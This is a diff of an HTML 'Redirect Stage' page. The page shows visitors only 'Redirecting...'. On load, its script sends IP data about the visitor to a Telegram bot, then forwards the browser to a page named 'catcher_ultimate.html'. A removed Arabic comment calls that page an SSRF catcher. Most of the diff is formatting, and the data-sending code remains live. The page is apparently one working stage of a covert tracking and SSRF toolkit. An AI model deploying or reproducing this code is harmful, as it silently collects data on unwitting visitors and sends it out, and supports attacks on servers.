@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <title>Redirect Stage</title>
@@ -20,8 +19,8 @@
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
       await fetch(url, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
       });
     }
 
@@ -41,16 +40,13 @@
       const msg = formatMessage(ipData);
       await sendToTelegram(msg);
 
-      // بعد الإرسال، ننتقل لصفحة SSRF catcher
       window.location.href = "catcher_ultimate.html";
     }
 
     window.onload = run;
   </script>
 </head>
-
 <body>
   <h1>Redirecting...</h1>
 </body>
-
 </html>
